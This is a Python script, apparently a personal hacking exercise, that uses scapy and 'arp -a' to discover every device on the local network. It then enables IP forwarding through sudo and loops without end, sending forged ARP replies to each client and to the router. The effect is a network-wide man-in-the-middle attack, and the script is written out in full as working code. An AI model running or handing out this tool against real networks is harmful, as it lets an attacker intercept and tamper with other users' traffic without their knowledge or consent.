#!/usr/local/bin/python3

import re
import os
import sys
import time
import socket
# import argparse
import subprocess
import scapy.all as scapy


# Global variables

my_ip           = ""
my_mac          = ""
router_ip       = ""
router_mac      = ""
clients_list    = []


def check_os():
    # Check the Operating System
    from sys import platform
    if platform == "linux" or platform == "linux2":
        print("[+] You are running: Linux\n")
        return "Linux"
    elif platform == "darwin":
        print("[+] You are running: OSX\n")
        return "OSX"
    else:
        print("[-] You are running: Other Operating System\n")
        print("[-] This operating system is not supported yet.\n")
        sys.exit()


def get_my_ip():
    global my_ip

    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        # doesn't even have to be reachable
        s.connect(('10.255.255.255', 1))
        IP = s.getsockname()[0]
    except:
        IP = '127.0.0.1'
    finally:
        s.close()

    my_ip = IP.rstrip()


def get_current_mac(interface):
    global my_mac
    # Check if MAC has been changed correctly
    ifconfig_result = subprocess.check_output(["ifconfig", interface]).decode('utf-8')

    spoofed_mac = re.search(r"\w\w:\w\w:\w\w:\w\w:\w\w:\w\w", ifconfig_result)

    if spoofed_mac:
        my_mac = spoofed_mac.group(0).rstrip()
    else:
        print("[-] Could not find MAC address")


def get_router_ip(opsys):
    global router_ip
    if opsys == "OSX":
        router_ip = os.popen('netstat -nr | grep default | grep -o \'[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\'').read().rstrip()
    else:
        router_ip = os.popen('ip route show | grep - i \'default via\' | awk \'{print $3 }\'').read().rstrip()


def allow_package_routing(opsys):
    # add your user to /etc/sudoers so you don't get prompted for the sudo password
    # https://apple.stackexchange.com/questions/257813/enable-sudo-without-a-password-on-macos
    if opsys == "OSX":
        os.popen('sudo sysctl -w net.inet.ip.forwarding=1').read()
    else:
        os.popen('sudo echo 1 > /proc/sys/net/ipv4/ip_forward')


def push_client(ip,mac):
    global router_mac
    global router_ip
    global my_ip
    global clients_list

    if mac == 'ff:ff:ff:ff:ff:ff':
        return False
    elif ip == router_ip:
        router_mac = mac
        return False
    elif ip == my_ip:
        return False
    else:
        exists = False
        for existing in clients_list:
            if ip == existing["ip"]:
                exists = True
        if not exists:
            client_dict = {"mac": mac, "ip": ip}
            clients_list.append(client_dict)


def arp_network():
    print("[+] Scanning network via \"arp -a\" command...")
    arp_answers = os.popen('arp -a').read()
    arp_answers = re.findall(r"\(.*\) at \w\w:\w\w:\w\w:\w\w:\w\w:\w\w",arp_answers)
    print("[+] received " + str(len(arp_answers)) + " responses\n")

    for answer in arp_answers:
        ip =  re.search(r"[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}",answer).group()
        mac = re.search(r"\w\w:\w\w:\w\w:\w\w:\w\w:\w\w", answer).group()
        push_client(ip,mac)


def scan_network(ip):
    print("[+] Scanning IP range for connected clients: " + ip)

    # combine two packets and send
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request

    # send the packet
    print("[+] Sending ARP packets...")
    answered_list, unanswered_list = scapy.srp(arp_request_broadcast, timeout=5, verbose=False)  # packet, timeout
    print("[+] received " + str(len(answered_list)) + " responses\n")

    # process responses
    for answer in answered_list:
        push_client(answer[1].psrc,answer[1].hwsrc)


def print_clients(clients):

    print("\nIP\t\t\tMAC Address\n-----------------------------------------")

    # received responses
    for client in clients:
        print(client["ip"] + "\t\t" + client["mac"])

    print(" ")


def spoof(target,spoof):

    # this is the packet that is set to the victim device
    packet      = scapy.ARP(op=2,pdst=target["ip"],hwdst=target["mac"],psrc=spoof["ip"])

    # we set "op" to 2 because it's a response packet, not a request
    # we set "pdst" to the IP of the target machine (use networkscanner.py)
    # we set "hwdst" to the MAC address of the target machine (use networkscanner.py)
    # we set "psrc" to the IP of the router (use networkscanner.py)

    # print(packet.summary())
    # print(packet.show())
    # print(" ")

    scapy.send(packet, verbose=False)


# Launch script
os.system('clear')

# Get main IPs
opsys = check_os()
get_my_ip()
get_current_mac("en0")
get_router_ip(opsys)

# Scan current sub-network's connected devices (IPs and MACs)
my_subnet       = my_ip.rpartition('.')[0] + ".1/24"
router_subnet   = router_ip.rpartition('.')[0] + ".1/24"

scan_network(my_subnet)

# Scan router's sub-network (if it's different)
if my_subnet != router_subnet:
    scan_network(router_subnet)

# Scan with "arp -a" command, just in case
arp_network()

# List own device and router separately
print("[+] Your device:  " + my_ip + " / " + my_mac)
print("[+] Your router:  " + router_ip + " / " + router_mac)

print("\n[+] Connected clients:")
print_clients(clients_list)

# Allow package routing (same as packetforwarding.sh)
allow_package_routing(opsys)

# Spoof all devices (using list of connected devices)
print("\n[+] Spoof all connected clients:")

while True:
    for client in clients_list:
        # send spoof packets continuously to router and victim
        router = {"mac": router_mac,"ip": router_ip}
        spoof(client,router)
        spoof(router,client)
        print("[+] Sent two spoof packets: " + client["ip"] + " & " + router_ip)
    time.sleep(2)

